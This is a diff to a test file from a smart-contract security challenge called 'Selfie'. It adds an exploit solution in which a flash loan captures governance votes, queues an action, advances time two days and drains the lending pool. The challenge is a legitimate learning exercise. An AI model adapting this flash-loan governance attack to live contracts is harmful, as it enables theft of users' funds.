@@ -30,7 +30,16 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            Using the weak governance mecanism, an attacker can execute a flash loan to queue any action on behalf of the governance contract.
+            This allows to drain all the funds in the 'SelfiePool' to the attacker.
+        */
+        const AttackerContractFactory = await ethers.getContractFactory('SelfieExploit', attacker);
+        this.attackerContract = await AttackerContractFactory.deploy(attacker.address, this.governance.address);
+
+        await this.attackerContract.exploit(this.pool.address, TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.attackerContract.drainPool(); 
     });
 
     after(async function () {
